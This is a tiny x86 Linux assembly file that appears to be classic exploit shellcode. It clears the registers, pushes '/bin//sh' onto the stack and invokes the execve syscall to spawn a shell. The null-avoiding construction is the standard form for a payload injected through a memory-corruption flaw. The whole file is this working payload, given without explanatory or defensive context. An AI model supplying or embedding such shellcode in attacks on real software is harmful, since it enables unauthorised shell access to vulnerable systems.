;



;

global _start

section .text  

_start:
;clear registers
xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edx,edx
push eax
push 0x68732f2f ;/bin//sh
push 0x6e69622f
mov ebx,esp
mov al,0xb ;execve syscall :)
int 0x80